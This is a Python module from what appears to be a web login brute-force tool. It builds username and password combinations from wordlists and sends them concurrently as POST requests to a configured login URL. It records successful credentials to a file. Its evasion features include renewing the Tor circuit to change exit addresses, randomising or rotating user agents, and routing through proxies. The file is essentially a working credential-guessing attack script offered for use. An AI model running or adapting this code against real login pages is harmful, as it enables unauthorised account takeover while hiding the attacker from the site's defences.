import asyncio
import aiofiles as aiof
import aiohttp
import uvloop
import random
import ua_generator
import logging
from multiprocessing import Process, Lock
from stem.control import Controller
from stem import SocketError
from typing import Any, List, Optional
from . import verify_response, HeadersReader
from .process import PreProcessing

log = logging.getLogger(__name__)

# Set the event loop policy to uvloop for better performance.
uvloop.install()
asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

class Tor:
    """
    Class to manage Tor connections.
    """
    def __init__(self, config: Any):
        self.tor = config
        self.controller: Optional[Controller] = None

    def connect(self) -> None:
        """
        Connect to the Tor network.
        """
        try:
            self.controller = Controller.from_port(port=self.tor.control_port)
            self.controller.authenticate(password=self.tor.password)
            log.debug("BOLDConnected to ControlPort")
        except (ConnectionRefusedError, ConnectionError, SocketError) as err:
            log.critical(f"Error trying to connect to Tor: {str(err)}")

    def renew_circuit(self) -> None:
        """
        Renew the Tor circuit.
        """
        if self.controller and self.controller.is_authenticated():
            try:
                self.controller.signal("NEWNYM")
                log.debug("BOLDThe new circuit was created successfully")
            except Exception as e:
                log.critical(f"Failed to create another circuit:\n{e}")

    def close(self) -> None:
        """
        Close the connection to the Tor network.
        """
        if self.controller:
            self.controller.close()
        
class Attack:
    """
    Class to manage the attack.
    """
    def __init__(
            self, 
            config: str, 
            proxy: str = None, 
            random_agent: Optional[bool] = False, 
            user_agent: Optional[str] = None,
            user_agent_list_file: Optional[str] = None,
            output: Optional[str] = None
            ) -> None:
        self.config = config
        self.output = output
        self.headers = HeadersReader(self.config.body.headers).headers 
        self.response = self.config.response.success or self.config.response.fail
        if user_agent:
            self.headers['User-Agent'] = user_agent
        elif random_agent:
            self.headers['User-Agent'] = ua_generator.generate().text
        if user_agent_list_file:
            with aiof.open(user_agent_list_file, "r") as file:
                user_agents = file.read().splitlines()
            self.headers['User-Agent'] = random.choice(user_agents)
        self.proxy: Optional[str] = proxy

    async def load_wordlists(self) -> None:
        """
        Load wordlists from the file.
        """
        log.info("Loading and preparing payloads")
        return await PreProcessing(self.config.credentials.passwords, self.config.credentials.usernames).make(self.config.body.data)
    
    async def attack(self, id: int | str = "MAIN"):
        """
        Send the payload to the target.
        """
        payloads = await self.load_wordlists()
        total = len(payloads)
        log.info(f"BOLDPayloads were created with successful | __H{total}__h payloads")
        log.info("Starting the attack")
        sm = asyncio.Semaphore(int(self.config.connection.limit_connections))
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(
                limit=int(self.config.connection.limit_connections), 
                verify_ssl=int(self.config.connection.verify_ssl),
                loop=asyncio.get_event_loop(),
            ),
            timeout=aiohttp.ClientTimeout(total=self.config.connection.timeout),
            headers=self.headers or {}
        ) as client:
            log.info("BOLDEverything is ready")
            y = input("Do you want to proccedd with the attack? [Y/n] ").lower() or "y"
            if "n" in y:
                log.info("BOLDAttack cancelled")
                return None
            log.info(f"BOLDStarting the attack with __H{total}__h payloads")
            tasks = [
                asyncio.create_task(self.send(data=data, client=client, sm=sm, i=i, id=id, total=total))
                for i, data in enumerate(payloads)
            ]

            return await asyncio.gather(*tasks)

    async def send(self, data: str, client: aiohttp.ClientSession, sm: asyncio.Semaphore, i: int, id, total: int = 0) -> tuple[str, any]:
        """
        Send a POST request with the given data.
        """
        async with sm:
            try:
                async with client.request(
                    url=self.config.body.url, 
                    method=self.config.body.method, 
                    data=data,
                    proxy=self.proxy,
                    allow_redirects=bool(self.config.connection.allow_redirects),
                    verify_ssl=self.config.connection.verify_ssl,
                ) as response:
                        
                    had_success: bool = await verify_response(expected_response=self.response, response=response)

                    if (self.config.response.success and had_success) or (self.config.response.fail and not had_success):
                            log.info(f"BOLD[ATTEMPT] ({i + 1}/{total}) - \033[38;2;255;0;111m{id}\033[0m - \033[32;1m{data}\033[0m => \033[32;1mSUCCESS\033[0m : \033[38;5;214m{response.status}\033[0m")
                            if self.output:
                                async with aiof.open(self.output, "a") as file:
                                    await file.write(f"[+] {data} - {response.status_code}\n")
                            return None
                    log.debug(f"[ATTEMPT] ({i + 1}/{total}) - {id} - {data} => \033[31;1mFAIL\033[0m : \033[38;5;214m{response.status}\033[0m")
            except aiohttp.ClientError as e:
                log.debug(f"[RE-ATTEMPT] ({i + 1}/{total}) - {id} - {data} => \033[38;5;214mTRYING AGAIN\033[0m : \033[38;5;214m{e}\033[0m")
                return await self.send(data, client, sm, i, id, total)
            except asyncio.TimeoutError:
                log.debug(f"[TIMEOUT] ({i + 1}/{total}) - {id} - {data} => \033[31;1mTIMEOUT\033[0m : \033[38;5;214m{self.config.connection.timeout}\033[0ms")
                return await self.send(data, client, sm, i, id, total)
            except KeyboardInterrupt:
                log.error("User interrupted.")
                return None

class MultipleWordlists(Attack):
    """
    Class to manage attacks with multiple wordlists.
    """
    def __init__(
            self, 
            config: str, 
            number_of_threads: int = 5,
            proxy: Optional[str] = None, 
            random_agent: Optional[bool] = True,
            user_agent_list: Optional[str] = None,
            output: Optional[str] = None
            ):
        super().__init__(
            config, 
            proxy=proxy,
            random_agent=random_agent,
            user_agent_list_file=user_agent_list,
            output=output
            )
        self.number_of_threads = number_of_threads

    async def get_wordlists(self, number_of_threads) -> List[List[str]]:
        """
        Get wordlists for usernames and passwords.
        """
        wordlists = [[], []]
        if isinstance(self.config.credentials.passwords, list):
            wordlists[0] = self.config.credentials.passwords
        else:
            wordlists[0] = [self.config.credentials.passwords] * number_of_threads
        if isinstance(self.config.credentials.usernames, list):
            wordlists[1] = self.config.credentials.usernames
        else:
            wordlists[1] = [self.config.credentials.usernames] * number_of_threads

        return wordlists

    async def get_payloads(self, id: int, wordlists: List[str]) -> List[str]:
        """
        Get payloads for a specific wordlist ID.
        """
        
        return await PreProcessing(wordlists[0][id], wordlists[1][id]).make(self.config.body.data)

    async def attack(self, payloads: List[List[str]], id: int) -> None:
        """
        Perform an attack with payloads from a specific wordlist ID.
        """
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(
            limit=int(self.config.connection.limit_connections),
            verify_ssl=self.config.connection.verify_ssl,
            loop=asyncio.get_event_loop()
        ),
        timeout=aiohttp.ClientTimeout(total=self.config.connection.timeout),
        headers=self.headers or {}
        ) as client:
            sm = asyncio.Semaphore(int(self.config.connection.limit_connections))
            total = len(payloads)
            log.info(f"BOLDPayloads were created with successful | __H{total}__h payloads (__H#{id}__h)")
            log.debug(f"Starting attack for wordlist for __H{total}__h payloads (#__H{id}__h)")
            
            tasks = [
                asyncio.create_task(self.send(data=data, client=client, sm=sm, i=i, id=id, total=total))
                for i, data in enumerate(payloads)
            ]

            return await asyncio.gather(*tasks)
        

    def proccess(self, payloads: List[str], id: int) -> None:
        """
        Start the attack in a separate process.
        """
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self.attack(payloads=payloads, id=id))

    async def start(self) -> None:
        """
        Start the attack threads.
        """
        number_of_proccess = len(self.config.credentials.passwords) if isinstance(self.config.credentials.passwords, list) else len(self.config.credentials.usernames)
        log.info(f"Getting the wordlists for __H{number_of_proccess}__h clients")
        wordlists = await self.get_wordlists(number_of_threads=number_of_proccess)
        log.info(f"BOLDWordlists were read with success | __H{number_of_proccess}__h wordlists")
        log.info(f"BOLDStarting the attack with __H{number_of_proccess}__h clusters")

        # creating payloads for each wordlist

        payloads = [[]] * number_of_proccess

        log.info("BOLDEverything is ready")
        y = input("Do you want to proccedd with the attack? [Y/n] ").lower() or "y"
        if "n" in y:
            log.info("BOLDAttack cancelled")
            return None

        for i in range(number_of_proccess):
            payloads[i] = await self.get_payloads(i, wordlists)
            log.info(f"BOLDPayloads for core {i} were created with successful | __H{len(payloads[i])}__h payloads (__H#{i}__h)")

        p = []
        for i in range(number_of_proccess):
            p.append(Process(target=self.proccess, args=(payloads[i], i)))
            
        for proccess in p:
            proccess.start()
        for process in p:
            p.join()
        log.info("BOLDAttack finished")
        return None

async def test_proxy_connection(client: aiohttp.ClientSession, proxy: str) -> None | int:
    try:
        r: aiohttp.ClientResponse = await client.get("https://torproject.org", proxy=proxy)
        return r.status
    except aiohttp.ClientProxyConnectionError as e:
        log.warning(f"The proxy server is refusing connections.\nCheck the proxy settings to make sure that they are correct.\nContact your network administrator to make sure the proxy server is working;\n\n{e}")
        return None
    except aiohttp.ClientError as e:
        log.error(f"Client error: {e}")
        return None
    except asyncio.TimeoutError:
        log.error("Timeout error")
        return None
    except Exception as e:
        log.critical(f"Unexpected error: {e}")
        return None

    